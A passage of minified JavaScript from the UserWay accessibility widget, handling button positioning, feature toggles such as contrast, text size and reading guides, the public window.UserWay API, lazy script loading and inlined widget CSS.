    } else -1 !== [5, 6, 7].indexOf(s) && ("left" === r && (n = -n), i.style.setProperty("left", Gt.leftRightSide.left + n + "px", "important"));
    if (a) if (-1 !== [3, 4, 5].indexOf(s)) "top" === o && (a = -a), i.style.setProperty("bottom", Gt.leftRightSide.bottom + a + "px", "important");else if (-1 !== [2, 6].indexOf(s)) {
      var u = "bottom" === o ? " - " : " + ";
      i.style.setProperty("top", "calc(" + Gt.middle.top + "%" + u + a + "px)", "important");
    } else -1 !== [1, 7, 8].indexOf(s) && ("bottom" === o && (a = -a), i.style.setProperty("top", Gt.leftRightSide.top + a + "px", "important"));
  }
  function ye(e, t, i) {
    void 0 === t && (t = !1), void 0 === i && (i = !1);
    var n = e || F();
    e && (at.settings[t ? Pt : Mt] = {}, dt.setProperty(at, t ? Pt : Mt, i ? n : null));
    var a = document.querySelector(".uwy"),
      r = document.querySelector(".uwif");
    (pe(r, "userway_p"), r.classList.add("userway_p" + n), a && (pe(a, "userway_p"), a.classList.add("userway_p" + n), setTimeout(function () {
      a.style.setProperty("visibility", "", "");
    }, 250)), dt.getProperty(at, "userway_hidden")) && document.querySelector(".uwy").classList.add("userway_hidden");
  }
  function ge() {
    var e = ["s2", "s4", "s6", "s7", "s12", "s13", "s14", "s23"];
    return at.services.hasOwnProperty("MODIFY_MENU") && at.services.MODIFY_MENU.is_enabled ? e.filter(function (e) {
      return -1 !== at.services.MODIFY_MENU.features_pattern.split("|").indexOf(e);
    }) : e;
  }
  function we(e) {
    at.settings.hideWidget = {};
    var t = e.timestamp > 0 ? {
      "max-age": e.timestamp / 1e3
    } : null;
    dt.setCookie("hidewidget", e.timestamp, t), ce(), re("hidden"), ge().forEach(function (e) {
      me(e, 0);
    });
    for (var i in at.settings) at.settings[i].hasOwnProperty("value") && (at.settings[i].value = 0);
    dt.postMessage({
      action: "updateVisuallyImpairedState",
      config: !1
    }), he();
  }
  function me(e, t) {
    var i = "userway-" + e;
    if (void 0 !== t) if ("s2" === e) at.settings[i].value = t, 0 === t && (at.settings["userway-s10"].value = t, at.settings["userway-s16"].value = t);else if ("s3" === e || "s14" === e || "s17" === e || "s23" === e) -1 !== [!1, 1, 2, 3].indexOf(t) ? at.settings[i].value = t : at.settings[i].value = 0;else if ("s4" === e || "s19" === e) -1 !== [!1, 1, 2, 3, 4].indexOf(t) ? at.settings[i].value = t : at.settings[i].value = 0;else if ("s21" === e || "s18" === e) -1 !== [!1, 1].indexOf(t) ? at.settings[i].value = t : at.settings[i].value = 0;else if ("s8" === e) for (var n in at.settings) at.settings[n].value = 0;else at.settings[i].value = t;
    he(), ve();
  }
  function he() {
    for (var e in at.settings) "userway_hidden" === e || e === Rt ? dt.setProperty(at, e, at.settings[e]) : dt.setProperty(at, e, at.settings[e].value);
    UserWayWidgetApp.ContextHolder.config = at;
  }
  function be() {
    for (var e in at.settings) at.settings.hasOwnProperty(e) && (at.settings[e].value = dt.getProperty(at, e));
  }
  function _e() {
    if ("undefined" != typeof _userway_config) for (var e in _userway_config) _userway_config.hasOwnProperty(e) && (at[e] = _userway_config[e]);
  }
  function ve(e) {
    if (void 0 === e && (e = !1), window.UserWayWidgetApp && window.UserWayWidgetApp.lazyLoaded) {
      if (JSON.stringify(at.settings) !== JSON.stringify(ut)) {
        if (lt = {}, Object.keys(ut).length) for (var t in at.settings) at.settings.hasOwnProperty(t) && ut.hasOwnProperty(t) && at.settings[t].value !== ut[t].value && (lt[t] = JSON.parse(JSON.stringify(at.settings[t])));else lt = at.settings;
        for (var t in lt) !function (t) {
          if (at.settings.hasOwnProperty(t)) {
            var i = at.services && at.services.paidAi;
            if (at.settings[t] && at.settings[t].value && (i || -1 === Yt.indexOf(t))) {
              Ie("enable", t);
              var n = function () {
                  return Ue("enable", t);
                },
                a = dt.LIFE_CYCLE_EVENT.FEATURE_ENABLED_BASE,
                r = null;
              if ("userway-s2" === t) Pe.enableBigCursor(), r = "s2";else if ("userway-s3" === t) Fe.turnOffColorFeature(), Fe.turnOnColorFeature(t, at), r = "s3";else if ("userway-s4" === t) Re.enable(), r = "s4";else if ("userway-s6" === t) at.partner === atob("cmFrYmFuaw==") && window.location.pathname === atob("L3dwcy9wb3J0YWwvUHJlcGFpZENhcmRTZWxmQ2FyZQ==") ? De.enable({
                rakBankExtraStyles: !0
              }) : De.enable(), r = "s6";else if ("userway-s7" === t) Be.disable(), He.enable(), r = "s7";else if ("userway-s9" === t) Me.enable(), Ne.enable().then(n), r = "s9", window.localStorage.setItem("readerSpeed", at.settings[t].value);else if ("userway-s10" === t) Pe.enableReadingGuide(), r = "s10";else if ("userway-s11" === t) {
                var o = e ? 2e3 : 0;
                setTimeout(function () {
                  ze.showPageStructureHeaders().then(n), r = "s11";
                }, o);
              } else "userway-s12" === t ? (qe.enable(), r = "s12") : "userway-s13" === t ? (Ve.enable(), r = "s13") : "userway-s14" === t ? (je.enable(), r = "s14") : "userway-s15" === t ? (Be.enable(), r = "s15") : "userway-s16" === t ? (Pe.enableReadingMask(), r = "s16") : "userway-s17" === t ? (Ge.disable(), Ge.enable(), r = "s17") : "userway-s18" === t ? (Fe.enableSmartContrast(), r = "s18") : "userway-s19" === t ? (Ye.disable(), Ye.enable(), r = "s19") : "userway-s23" === t ? (Ke.disable(), Ke.enable(), r = "s23") : "userway-s21" === t ? (Je.enable().then(n), b(), r = "21") : "userway-s24" === t ? (Promise.all([Ne.preload(), Ze.enable()]).then(n), ce(), b(), r = "s24") : "userway-s25" === t ? (et.enable(), r = "s25") : "userway-s101" === t ? r = "s101" : "userway-s102" === t ? r = "s102" : "userway-s103" === t ? r = "s103" : "userway-s104" === t ? r = "s104" : "userway-s105" === t ? r = "s105" : "userway-s106" === t ? r = "s106" : "userway-s107" === t ? r = "s107" : "userway-s108" === t && (r = "s108");
              r && ne(a, r, at.settings[t].value), !["userway-s21", "userway-s11", "userway-s9"].includes(t) && n();
            } else if (!e) {
              Ie("disable", t);
              var a = dt.LIFE_CYCLE_EVENT.FEATURE_DISABLED_BASE,
                s = null;
              if ("userway-s2" === t) Pe.disableBigCursor(), s = "s2";else if ("userway-s3" === t) Fe.turnOffColorFeature(), s = "s3";else if ("userway-s4" === t) Re.disable(), s = "s4";else if ("userway-s5" === t) console.warn("s5 key: shouldn't happen anymore");else if ("userway-s6" === t) at.partner === atob("cmFrYmFuaw==") && window.location.pathname === atob("L3dwcy9wb3J0YWwvUHJlcGFpZENhcmRTZWxmQ2FyZQ==") ? De.disable({
                rakBankExtraStyles: !0
              }) : De.disable(), s = "s6";else if ("userway-s7" === t) He.disable(), s = "s7";else if ("userway-s9" === t) Ne.disable(), Me.disable(), s = "s9";else if ("userway-s10" === t) Pe.disableReadingGuide(), s = "s10";else if ("userway-s12" === t) qe.disable(), s = "s12";else if ("userway-s13" === t) Ve.disable(), s = "s13";else if ("userway-s14" === t) je.disable(), s = "s14";else if ("userway-s15" === t) Be.disable(), s = "s15";else if ("userway-s16" === t) Pe.disableReadingMask(), s = "s16";else if ("userway-s17" === t) Ge.disable(), s = "s17";else if ("userway-s18" === t) Fe.disableSmartContrast(), s = "s18";else if ("userway-s19" === t) Ye.disable(), s = "s19";else if ("userway-s23" === t) Ke.disable(), s = "s23";else if ("userway-s21" === t) {
                Je.disable(), s = "s21", document.querySelector(".uwaw-dictionary-tooltip").classList.remove("uwaw-dictionary-tooltip_active");
                var u = document.querySelector(".uwaw-dictionary-tooltip__i");
                u && u.remove();
              } else "userway-s24" === t ? (Ze.disable(), s = "s24") : "userway-s25" === t ? (et.disable(), s = "s25") : "userway-s101" === t ? s = "s101" : "userway-s102" === t ? s = "s102" : "userway-s103" === t ? s = "s103" : "userway-s104" === t ? s = "s104" : "userway-s105" === t ? s = "s105" : "userway-s106" === t ? s = "s106" : "userway-s107" === t ? s = "s107" : "userway-s108" === t && (s = "s108");
              s && ne(a, s), Ue("disable", t);
            }
          }
        }(t);
        ut = JSON.parse(JSON.stringify(at.settings));
      }
      a() && xe(), nt.showPageStructureLinks = ze.showPageStructureLinks;
    }
  }
  function xe() {
    var e = document.querySelector(".uwy");
    Object.keys(at.settings).some(function (e) {
      var t;
      return (null === (t = at.settings[e]) || void 0 === t ? void 0 : t.value) && "userway-positionWidget" !== e;
    }) ? e.classList.add("uen") : e.classList.remove("uen");
  }
  function Ee() {
    window.UserWay = new function () {
      function e(e, t) {
        if (void 0 === t) {
          var i = "userway-" + e,
            n = nt.getFeaturesSettings(),
            a = n[i].value;
          "s4" === e || "s19" === e ? a ? a < 4 ? a += 1 : a = 0 : a = 1 : "s9" === e ? n[i].disabled ? a = 0 : a < 3 ? a += 1 : a = !a : "s17" === e || "s23" === e || "s3" === e || "s14" === e ? a ? a < 3 ? a += 1 : a = 0 : a = 1 : a = "s21" === e || "s101" === e || "s102" === e || "s103" === e || "s104" === e || "s105" === e || "s106" === e || "s107" === e || "s108" === e ? a ? 0 : 1 : !a, t = a;
        }
        Ae().then(function (i) {
          nt.setFeature(e, t);
          var n = {
            action: "feature_use",
            name: e
          };
          t && (n.value = t), dt.postMessage(n);
        });
      }
      var t = this;
      return t.getVersion = function () {
        return "1.0.0";
      }, t.getAccessibilityScore = function () {
        gt.accessibilityScore();
      }, t.widgetToggle = function () {
        nt.toggleWidget();
      }, t.widgetOpen = function () {
        nt.openWidget();
      }, t.widgetClose = function () {
        nt.closeWidget();
      }, t.enableVoiceNavigation = function (e) {
        b(), Ne.preload(), Ze.enable(e);
      }, t.disableVoiceNavigation = function () {
        Ze.disable();
      }, t.keyboardNavToggle = function () {}, t.keyboardNavEnable = function () {}, t.keyboardNavDisable = function () {}, t.bigCursorToggle = function () {
        e("s2");
      }, t.bigCursorEnable = function () {
        e("s2", 1);
      }, t.bigCursorDisable = function () {
        e("s2", 0);
      }, t.contrastToggle = function () {
        e("s3");
      }, t.contrastEnable = function (t) {
        -1 !== [1, 2, 3].indexOf(t) ? e("s3", t) : e("s3");
      }, t.contrastDisable = function () {
        e("s3", 0);
      }, t.bigTextToggle = function () {
        e("s4");
      }, t.bigTextEnable = function (t) {
        -1 !== [1, 2, 3, 4].indexOf(t) ? e("s4", t) : e("s4");
      }, t.bigTextDisable = function () {
        e("s4", 0);
      }, t.highlightToggle = function () {
        e("s6");
      }, t.highlightEnable = function () {
        e("s6", 1);
      }, t.highlightDisable = function () {
        e("s6", 0);
      }, t.legibleFontsToggle = function () {
        e("s7");
      }, t.legibleFontsEnable = function () {
        e("s7", 1);
      }, t.legibleFontsDisable = function () {
        e("s7", 0);
      }, t.textSpacingToggle = function () {
        e("s14");
      }, t.textSpacingEnable = function (t) {
        e("s14", t);
      }, t.textSpacingDisable = function () {
        e("s14", 0);
      }, t.lineHeightToggle = function () {
        e("s17");
      }, t.lineHeightEnable = function (t) {
        e("s17", t);
      }, t.lineHeightDisable = function () {
        e("s17", 0);
      }, t.inlineDictionaryToggle = function () {
        e("s21");
      }, t.inlineDictionaryEnable = function (t) {
        e("s21", t);
      }, t.inlineDictionaryDisable = function () {
        e("s21", 0);
      }, t.textAlignToggle = function () {
        e("s19");
      }, t.textAlignEnable = function (t) {
        e("s19", t);
      }, t.textAlignDisable = function () {
        e("s19", 0);
      }, t.saturationToggle = function () {
        e("s23");
      }, t.saturationEnable = function (t) {
        e("s23", t);
      }, t.saturationDisable = function () {
        e("s23", 0);
      }, t.resetAll = function () {
        e("s8");
      }, t.readPageToggle = function () {
        e("s9");
      }, t.readPageEnable = function (t) {
        void 0 === t && (t = 1), e("s9", t);
      }, t.readPageDisable = function () {
        e("s9", 0);
      }, t.readingGuideToggle = function () {
        e("s10");
      }, t.readingGuideEnable = function () {
        e("s10", !0);
      }, t.readingGuideDisable = function () {
        e("s10", !1);
      }, t.readingMaskToggle = function () {
        e("s16");
      }, t.readingMaskEnable = function () {
        e("s16", !0);
      }, t.readingMaskDisable = function () {
        e("s16", !1);
      }, t.dyslexiaFontToggle = function () {
        e("s15");
      }, t.dyslexiaFontEnable = function () {
        e("s15", !0);
      }, t.dyslexiaFontDisable = function () {
        e("s15", !1);
      }, t.iconVisibilityToggle = function () {
        nt.manageIconVisibility();
      }, t.iconVisibilityOn = function () {
        nt.manageIconVisibility("visible");
      }, t.iconVisibilityOff = function () {
        nt.manageIconVisibility("hidden");
      }, t.preloadWidget = function () {
        Te();
      }, t.pageStructureHeaders = function () {
        ze.showPageStructureHeaders();
      }, t.pageStructureLandmarks = function () {
        ze.showPageStructureLandmarks();
      }, t.pageStructureLinks = function () {
        ze.showPageStructureLinks();
      }, t.pageStructureDisable = function () {
        ze.closePageStructureDialog();
      }, t.tooltipsToggle = function () {
        e("s12");
      }, t.tooltipsEnable = function () {
        e("s12", 1);
      }, t.tooltipsDisable = function () {
        e("s12", 0);
      }, t.stopAnimationToggle = function () {
        e("s13");
      }, t.stopAnimationEnable = function () {
        e("s13", 1);
      }, t.stopAnimationDisable = function () {
        e("s13", 0);
      }, t.changeWidgetLanguage = function (e) {
        Ae().then(function () {
          j(e, !0);
        });
      }, t.enableSmartContrast = function () {
        e("s18", 1);
      }, t.disableSmartContrast = function () {
        e("s18", 0);
      }, t.enableHideImages = function () {
        e("s25", 1);
      }, t.disableHideImages = function () {
        e("s25", 0);
      }, t.debug = function () {
        try {
          localStorage.setItem("debug", "true" === localStorage.getItem("debug") ? "false" : "true"), document.location.reload();
        } catch (e) {
          console.log("debug mode activation failed", e);
        }
      }, t.toggleInitialPagePreload = function () {
        var e = window.localStorage.getItem(it),
          t = !JSON.parse(e);
        window.localStorage.setItem(it, t.toString()), console.log("Initial page widget preload is " + (t ? "enabled" : "disabled") + "!");
      }, t.setPosition = function (e, t, i) {
        void 0 === i && (i = !1), ye(e, t, i);
      }, t;
    }();
  }
  function Le(e) {
    var t = document.createElement("div");
    t.classList.add("uw-s12-tooltip"), t.setAttribute("aria-hidden", "true"), Se(t);
    var i = document.createElement("div"),
      n = document.createElement("div"),
      a = document.createElement("div"),
      r = document.createElement("div"),
      o = document.createElement("div");
    i.classList.add("uw-s10-reading-guide"), n.classList.add("uw-s10-left-ruler-guide"), a.classList.add("uw-s10-right-ruler-guide"), r.classList.add("uw-s10-bottom-ruler-guide"), o.classList.add("uw-s10-reading-guide__arrow"), i.appendChild(o), Se(i), Se(n), Se(a), Se(r);
    var s = document.createElement("div");
    s.innerHTML = e, s.classList.add("uwy"), s.setAttribute("data-uw-feature-ignore", "true"), at.isMobile && s.classList.add("umb"), s.style.setProperty("background-color", "transparent", "important"), s.style.setProperty("overflow", "initial", "important"), s.style.setProperty("visibility", "hidden", ""), Se(s), s.setAttribute("title", dt.getUserWayIconElementTitle(at));
    var u = at.services && (at.services.CUSTOM_BRANDING || at.services.WHITE_LABEL),
      l = document.querySelectorAll(".uwif");
    if (l && l.length) {
      var d = l[0];
      d.setAttribute("title", u ? dt.getUserWayIconElementTitle(at) : "UserWay " + dt.getUserWayIconElementTitle(at)), d.style.setProperty("width", "100vw", "important"), d.style.setProperty("max-width", "100vw", "important"), d.style.setProperty("visibility", "visible", "important"), d.style.setProperty("opacity", "1", "important"), d.style.setProperty("color-scheme", "light", "important");
      /Android/i.test(navigator.userAgent) && (d.style.setProperty("height", "100%", "important"), d.style.setProperty("max-height", "100%", "important"));
    }
    var c = We();
    c && c.length && window.UserWay.iconVisibilityOff();
  }
  function Se(e) {
    var t = document.body;
    t.insertBefore(e, t.children[0]);
  }
  function Ae() {
    return Bt ? Ht : (dt.addUwStylesheetUDFFont(at), UserWayWidgetApp.lazyLoaded ? UserWayWidgetApp.lazyLoaded && (Ht = Promise.resolve()) : (Bt = !0, Ht = new Promise(function (e, t) {
      dt.execJs(Lt + "widgetapp/2023-11-28-09-17-49/widget_app_lazy_1701163069272.js", "sha256-Bko9F7Iylyz7UjTms4XM06MlVPw8Q4KEBOTVoNwPtdI=").then(function (t) {
        ke(), UserWayWidgetApp.lazyLoaded = !0, a() && W(), Bt = !1, e();
      }, function (e) {
        console.error("Widgetapp lazyload error:", e), Bt = !1, t();
      });
    })), Ht);
  }
  function Te() {
    zt || (b(), Ae().then(function () {
      ot = bt.resolveUserLangSelection(), ot && at.language !== ot && (at.language = ot), se(at.language);
    }), zt = !0);
  }
  function ke() {
    Me = UserWayWidgetApp.getLib("keyboard_navigation"), Pe = UserWayWidgetApp.getLib("cursor"), Re = UserWayWidgetApp.getLib("bigger_text"), Fe = UserWayWidgetApp.getLib("uw_color_manipulation_service"), De = UserWayWidgetApp.getLib("highlinks"), He = UserWayWidgetApp.getLib("legible_text"), Be = UserWayWidgetApp.getLib("dyslexia_font"), Ne = UserWayWidgetApp.getLib("screen-reader-t"), ze = UserWayWidgetApp.getLib("page_structure"), qe = UserWayWidgetApp.getLib("tooltips"), Ve = UserWayWidgetApp.getLib("stop_animations"), je = UserWayWidgetApp.getLib("spacing_text"), Ge = UserWayWidgetApp.getLib("line_height"), Ye = UserWayWidgetApp.getLib("text_align"), Ke = UserWayWidgetApp.getLib("saturation"), Je = UserWayWidgetApp.getLib("inlineDictionary"), Ze = UserWayWidgetApp.getLib("voice-navigation"), et = UserWayWidgetApp.getLib("hide_images");
  }
  function We() {
    if (!at || !Object.keys(at.tunings).length) return null;
    var e = at._userway_config && at._userway_config.trigger,
      t = at.tunings && at.tunings.widget_custom_trigger,
      i = at.tunings && at.tunings.widget_custom_trigger_enabled,
      n = e || (i && t ? t : null),
      a = [];
    if (n) {
      "." !== n[0] && (n = "#" + n);
      try {
        a = [].slice.call(document.querySelectorAll(n));
      } catch (e) {
        console.error(e);
      }
    }
    return a;
  }
  function Oe() {
    var e = window.localStorage.getItem("should-preload-widget");
    JSON.parse(e) && Te();
  }
  function Ce() {
    var e, t, i;
    return (null === (e = at.services.WHITE_LABEL) || void 0 === e ? void 0 : e.hide_logo) || (null === (t = at.services.CUSTOM_BRANDING) || void 0 === t ? void 0 : t.custom_logo_image_link) || (null === (i = at.services.CUSTOM_BRANDING) || void 0 === i ? void 0 : i.custom_logo_image_path);
  }
  function Ie(e, t) {
    tt && tt.time(e + " " + t);
  }
  function Ue(e, t) {
    tt && tt.timeEnd(e + " " + t);
  }
  var Ne,
    Me,
    Pe,
    Re,
    Fe,
    De,
    He,
    Be,
    ze,
    qe,
    Ve,
    je,
    Ge,
    Ye,
    Ke,
    Xe,
    Je,
    Ze,
    Qe,
    $e,
    et,
    tt,
    it = "should-preload-widget",
    nt = UserWayWidgetApp.addLib("main"),
    at = {},
    rt = !1,
    ot = null,
    st = !1,
    ut = {},
    lt = {},
    dt = UserWayWidgetApp.getLib("util"),
    ct = UserWayWidgetApp.getLib("localization_manager"),
    pt = UserWayWidgetApp.getLib("context_setter"),
    ft = UserWayWidgetApp.getLib("dom_observer"),
    yt = UserWayWidgetApp.getLib("skip_links"),
    gt = UserWayWidgetApp.getLib("scan_manager"),
    wt = UserWayWidgetApp.getLib("USER_TRACKING"),
    mt = UserWayWidgetApp.getLib("cpr_usage_detector"),
    ht = UserWayWidgetApp.getLib("tts-reader-status"),
    bt = UserWayWidgetApp.getLib("widget_language_resolver"),
    _t = UserWayWidgetApp.getLib("helpers"),
    vt = UserWayWidgetApp.getLib("WIDGET_HOTKEYS"),
    xt = "uaw",
    Et = {
      UW_BUTTON_POSITION: "1",
      UW_WIDGET_COLOR: "#003d68",
      UW_WIDGET_COLOR_GRADIENT: "off",
      UW_WIDGET_ICON_TYPE: "1",
      UW_WIDGET_ICON_SIZE: "small"
    },
    Lt = "https://cdn.userway.org/",
    St = "2023-11-28-09-17-49",
    At = "widgetapp/2023-11-28-09-17-49/remediation/remediation_1701163069272.js",
    Tt = "remediation/paid/remediation-tool.js?ts=1701163069272",
    kt = "remediation/free/remediation-tool-free.js?ts=1701163069272",
    Wt = "widgetapp/2023-11-28-09-17-49/contrast-remediation/remediation_1701163069272.js",
    Ot = "aria_editor/2023-11-28-09-17-49/index.html?v=1701163069272",
    Ct = Lt + "widget/2023-11-28-09-17-49/",
    It = "https://api.userway.org/api",
    Ut = ':root .uai,_::-webkit-full-page-media,_:future{outline-offset:-10px}.uw-s10-reading-guide{display:none;box-sizing:border-box;background:#000;width:40vw!important;min-width:200px!important;position:absolute!important;height:12px!important;border:solid 3px #fff300;border-radius:5px;top:20px;z-index:2147483647;transform:translateX(-50%)}.uw-s10-reading-guide__arrow{bottom:100%;left:50%;transform:translateX(-50%);width:20px;height:0;position:absolute}.uw-s10-reading-guide__arrow:after,.uw-s10-reading-guide__arrow:before{content:"";bottom:100%;left:50%;border:solid transparent;height:0;width:0;position:absolute;pointer-events:none}.uw-s10-reading-guide__arrow:after{border-bottom-color:#000;border-width:14px;margin-left:-14px}.uw-s10-reading-guide__arrow:before{border-bottom-color:#fff300;border-width:17px;margin-left:-17px}.uw-s10-left-ruler-guide,.uw-s10-right-ruler-guide{width:16px;height:9px;background:0 0;display:none;position:absolute!important;z-index:2147483647;transform:translateY(-50%)}.uw-s10-bottom-ruler-guide{width:36px;height:16px;background:0 0;display:none;position:absolute!important;z-index:2147483647;transform:translateX(-50%)}.usc{clip:rect(1px,1px,1px,1px);height:1px;width:1px;overflow:hidden;position:absolute!important;z-index:-1;opacity:0}.userway-s3-1{filter:invert(100%);-webkit-filter:invert(100%)}.userway-s3-1-white-bg{background:#fff!important}.userway-s3-1 iframe[name=userway]{filter:invert(1)!important}.userway-s3-1-ff{filter:invert(100%);-webkit-filter:invert(100%)}.userway-s3-3.userway-s6 [role=link],.userway-s3-3.userway-s6 [role=link] *,.userway-s3-3.userway-s6 a,.userway-s3-3.userway-s6 a *{color:#0000d3!important;background-color:#fff!important}.userway-s3-4-black{background-color:#888!important;color:#fff!important}.userway-s3-3.userway-s6 [role=link]:hover,.userway-s3-3.userway-s6 a:hover,.userway-s3-4-light{background-color:#fff!important;color:#000!important}.userway-s3-4{filter:grayscale(100%)!important;-webkit-filter:grayscale(100%)!important}.uiiw img,.ups img{max-width:100%!important}body .rvNotification{visibility:hidden!important}body .uwy{z-index:2147483647;position:fixed!important;transform:none!important}body .uwy .uai{text-align:initial!important;top:10px}body .uwy .uai .userway_dictionary_popup_container.hidden,body .uwy .uai.hidden,body .uwy.hidden{display:none}body .uwy.userway_p1 .uai{top:13px;right:auto;bottom:auto;left:calc(100vw - 21px);transform:translate(-100%)}body .uwy.userway_p2 .uai,body .uwy.userway_p3 .uai{top:50%;transform:translate(-100%,-50%);left:calc(100vw - 21px);right:auto}body .uwy.userway_p3 .uai{top:auto;bottom:13px;transform:translate(-100%)}body .uwy.userway_p4 .uai{top:auto;left:calc(50% - 22px);bottom:16px;right:auto}body .uwy.userway_p4.userway_hidden{bottom:-30px;top:auto;right:auto}body .uwy.userway_p4.userway_hidden.uo{bottom:13px}body .uwy.userway_p4.userway_hidden .uai{transform:translate(-50%,100%)}body .uwy.userway_p5 .uai{top:auto;bottom:13px;left:13px;right:auto}body .uwy.userway_p6 .uai{top:50%;transform:translateY(-50%);left:13px;right:auto;bottom:auto}body .uwy.userway_p7 .uai,body .uwy.userway_p8 .uai{top:13px;left:13px;right:auto;bottom:auto}body .uwy.userway_p8 .uai{left:50%;transform:translate(-50%)}body .uwy.userway_p8.userway_hidden .uai{transform:translate(-50%,-100%)}body .uwy.userway_p8.userway_hidden.uo{top:10px}body .uwy.userway_p4 .uai,body .uwy.userway_p8 .uai{left:50vw;transform:translateX(-50%)}body .uwy.uon .uai{background:#007dd5!important}body .uwy .uai img,body .uwy.uon .uwif{display:block!important}body .uwy .userway_ft_iframe_wrapper,body .uwy.uon.umb .uai,body .uwy.uon.usb .uai{display:none}body .uwy .uai .ups.white .si_w,body .uwy.userway_ft_on .uit{display:block}body .uwy.uen .uai .check_on{opacity:1;visibility:visible;top:-4px;right:-4px}body .uwy .uit,body .uwy .uwif{position:fixed;top:0;left:0;bottom:0;right:0;width:100%!important;max-width:100%!important;height:100%!important;visibility:visible!important;opacity:0!important;background:0 0!important;border:none;margin:0;padding:0;overflow:hidden;z-index:inherit;display:none}body .uwy .uai{position:fixed!important;cursor:pointer;background:#003d68!important;border-radius:50%!important;padding:3px;display:inline-block;width:40px;height:40px;min-width:40px;min-height:40px;max-width:40px;max-height:40px;box-sizing:content-box!important}body .uwy .uai:active,body .uwy .uai:focus,body .uwy .uai:hover{background:#007dd5}body .uwy .uai .ups,body .uwy .uai .usr{position:absolute;background-color:transparent!important}body .uwy .uai .ups{height:45px;width:45px;overflow:hidden;background-position:-48px -48px;background-size:140px;animation:standard .75s infinite linear;transform-origin:50% 50% 0!important;display:none;top:0;left:0}body .uwy .uai .ups .si_w{display:block}body .uwy .uai .ups .si_b,body .uwy .uai .ups.white .si_b{display:none}body .uwy .uai .ups .si_b,body .uwy .uai .ups .si_w{height:45px;width:45px;position:absolute;top:0;left:0}body .uwy .uai .usr{z-index:-1!important;top:-10px;right:-10px;bottom:-10px;left:-10px;display:inline-block}body .uwy .uai.uli .ui_w,body .uwy .uai.uli .ups .si_w{display:none}body .uwy .uai .ui_w,body .uwy .uai.uli .ui_b,body .uwy .uai.uli .ups .si_b,body .uwy .uai.userway_dark .ups .si_w{display:block}body .uwy .uai.loading .ups{display:block!important}body .uwy .uai .ui_b,body .uwy .uai.loading .ui_b,body .uwy .uai.loading .ui_w,body .uwy .uai.userway_dark .ups .si_b{display:none}.uwy .uai img:not(.check_on),body .uwy .uai img:not(.check_on){height:40px;width:40px;display:block;padding:0!important;margin:0!important;background:0 0!important;border:none!important;opacity:1!important;visibility:visible!important}body .uwy .uai .check_on{position:absolute;top:-7px;right:-4px;width:18px;height:20px;transition:.1s;opacity:0;visibility:hidden;background:0 0!important;border:none!important;padding:0!important;margin:0!important}body .uwy.utb .uai{padding:4px;width:57px;height:57px;min-width:57px;min-height:57px;max-width:57px;max-height:57px}body .uwy.utb .uai .ups{height:57px;width:57px;top:4px;left:4px}.uwy.utb .uai img:not(.check_on),body .uwy.utb .uai img:not(.check_on){width:57px;height:57px;padding:0!important;margin:0!important;background:0 0!important;border:none!important;opacity:1!important;visibility:visible!important}body .uwy.utb .uai .check_on{top:-2px;right:-2px;width:21px;height:21px}body .uwy.utb.userway_p1,body .uwy.utb.userway_p2,body .uwy.utb.userway_p3{right:30px}body .uwy.utb.userway_p3,body .uwy.utb.userway_p4,body .uwy.utb.userway_p5{bottom:30px}body .uwy.utb.userway_p4.userway_hidden{top:auto}body .uwy.utb.userway_p4.userway_hidden.uo{bottom:30px;margin:0!important}.uwy.uac.userway_p4.userway_hidden.uo .uai,.uwy.uac.userway_p8.userway_hidden.uo .uai,.uwy.utb.userway_p4.userway_hidden.uo .uai,.uwy.utb.userway_p8.userway_hidden.uo .uai,body .uwy.uac.userway_p4.userway_hidden.uo .uai,body .uwy.uac.userway_p8.userway_hidden.uo .uai,body .uwy.utb.userway_p4.userway_hidden.uo .uai,body .uwy.utb.userway_p8.userway_hidden.uo .uai{transform:translate(-50%,0%)}body .uwy.utb.userway_p4.userway_hidden .uai{transform:translate(-50%,100%)}body .uwy.utb.userway_p8.userway_hidden{top:13px}body .uwy.utb.userway_p8.userway_hidden.uo{top:13px;margin:0}body .uwy.utb.userway_p8.userway_hidden .uai{transform:translate(-50%,-100%)}body .uwy.utb.userway_p6,body .uwy.utb.userway_p7{left:11px}body .uwy.utb .ups{top:10px;left:11px}body .uwy.uac{border-radius:0!important}body .uwy.uac .uai{border-radius:5px!important;width:auto;height:auto;max-height:initial;max-width:initial;min-height:initial;min-width:initial}body .uwy.uac.userway_p1,body .uwy.uac.userway_p2,body .uwy.uac.userway_p3{right:50px}body .uwy.uac.userway_p1.userway_hidden .uai,body .uwy.uac.userway_p2.userway_hidden .uai,body .uwy.uac.userway_p3.userway_hidden .uai{transform:translateX(95%)}body .uwy.uac.userway_p5,body .uwy.uac.userway_p6,body .uwy.uac.userway_p7{left:50px}body .uwy.uac.userway_p5.userway_hidden .uai,body .uwy.uac.userway_p6.userway_hidden .uai,body .uwy.uac.userway_p7.userway_hidden .uai{transform:translateX(-95%)}body .uwy.uac.userway_p1 .uai,body .uwy.uac.userway_p7 .uai,body .uwy.uac.userway_p8 .uai{top:35px}body .uwy.uac.userway_p3 .uai,body .uwy.uac.userway_p4 .uai,body .uwy.uac.userway_p5 .uai{bottom:35px}body .uwy.uac.userway_p4 .uai,body .uwy.uac.userway_p8 .uai{left:50vw;transform:translateX(-50%);margin:0 auto;right:auto}body .uwy.uac.userway_p8.userway_hidden .uai{transform:translate(-50%,-130%)}body .uwy.uac.userway_p4.userway_hidden .uai{transform:translate(-50%,130%)}body .uwy.uac .loading{overflow:hidden}body .uwy.uac .loading:after{content:"";width:50%;height:4px;position:absolute;top:0;left:0;background-color:#fff;transform:translateX(-220%);animation:.9s linear infinite block_loading}body .uwy.uac .loading .ups{display:none!important}body .uwy.uac .loading.uli:after{background-color:#000}body .uwy.uac .uhi{top:44px}body .uwy.userway_p1.userway_hidden .uai,body .uwy.userway_p2.userway_hidden .uai,body .uwy.userway_p3.userway_hidden .uai{transform:translate(100%,-50%)}body .uwy.userway_p5.userway_hidden .uai,body .uwy.userway_p6.userway_hidden .uai,body .uwy.userway_p7.userway_hidden .uai{transform:translate(-100%,-50%)}body .uwy.uac.utb.userway_hidden.userway_p4{bottom:35px}body .uwy .uai{font-size:initial!important;transition:transform .4s!important}body .uwy:not(.uh) .uai:hover{transform:scale(1.1)!important}body .uwy:not(.uh).userway_p1 .uai:hover,body .uwy:not(.uh).userway_p3 .uai:hover{transform:translate(-100%) scale(1.1)!important}body .uwy:not(.uh).userway_p2 .uai:hover{transform:translate(-100%,-50%) scale(1.1)!important}body .uwy:not(.uh).userway_p4 .uai:hover,body .uwy:not(.uh).userway_p8 .uai:hover{transform:translateX(-50%) scale(1.1)!important}body .uwy:not(.uh).userway_p6 .uai:hover{transform:translateY(-50%) scale(1.1)!important}body .uwy 